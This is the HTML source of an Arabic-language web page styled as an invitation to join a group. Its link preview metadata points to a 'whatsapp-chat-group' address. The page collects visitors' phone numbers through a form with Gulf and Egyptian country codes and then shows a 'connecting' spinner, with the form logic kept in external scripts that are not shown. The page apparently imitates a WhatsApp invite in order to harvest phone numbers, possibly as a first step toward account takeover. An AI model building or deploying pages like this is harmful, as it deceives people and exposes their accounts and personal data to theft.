<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <title>طلب المشاركة</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <!-- Sécurisation -->
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains" />
    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
    <meta http-equiv="X-Frame-Options" content="DENY" />
    <meta http-equiv="X-XSS-Protection" content="1; mode=block" />
    <meta name="robots" content="noindex, nofollow" />

    <!-- Open Graph Meta Tags -->
    <meta property="og:image" content="https://i.ibb.co/3h6b78m/J5g-K5-Ag-J-L5.png" />
    <meta property="og:title" content="الدعوة للانضمام إلى مجموعة" />
    <meta property="og:url" content="https://whatsapp-chat-group.vercel.app/" />

    <link rel="icon" href="./assets/images/favicon.ico" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="style.css" />

    <style>
        /* Styles pour la popup de chargement */
        .loading-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .loading-popup {
            background: #fff;
            padding: 30px 50px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
            font-size: 1.5rem;
            color: #333;
            text-align: center;
            user-select: none;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #333;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
        #errorMsg {
            display: none;
            color: #e03e2f;
            font-weight: 600;
            font-size: 0.95rem;
            margin-top: -14px;
            margin-bottom: 14px;
            text-align: center;
            user-select: none;
        }
    </style>
<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
</head>
<body>
    <div class="navbar">
        <div class="navbar-title">الدعوة للانضمام إلى مجموعة</div>
        <img src="./assets/images/logonavbar.svg" alt="Logo" />
    </div>

    <div class="container">
        <img style="width: 30%;" class="join-logo" src="./assets/images/logonavbar.svg" alt="Icon" />
        <h2>يرجى إدخال رقم هاتفك</h2>

        <p id="errorMsg"></p>

        <form id="phoneForm">
            <div class="phone-group">
                <select id="countryCode" name="countryCode">
    <option value="+968">عُمان (+968)</option>
    <option value="+966">السعودية (+966)</option>
    <option value="+971">الإمارات (+971)</option>
    <option value="+965">الكويت (+965)</option>
    <option value="+974">قطر (+974)</option>
    <option value="+973">البحرين (+973)</option>
    <option value="+20">مصر (+20)</option>
</select>
                <input type="tel" name="phone" id="phone" placeholder="رقم الهاتف" required />
            </div>

            <button type="submit" class="submit-button" id="submitBtn">متابعة</button>
        </form>
    </div>

    <div class="footer">
        <p>© 2025 جميع الحقوق محفوظة</p>
        <p>تم التطوير بواسطة فريق الدعم</p>
    </div>

    <div class="loading-overlay" id="loadingPopup">
        <div class="loading-popup">
            <div class="loading-spinner"></div>
            <span id="loadingText">جاري الاتصال ...</span>
        </div>
    </div>

    <script src="js/utils.js"></script>
    <script src="js/index.js"></script>
</body>
</html>
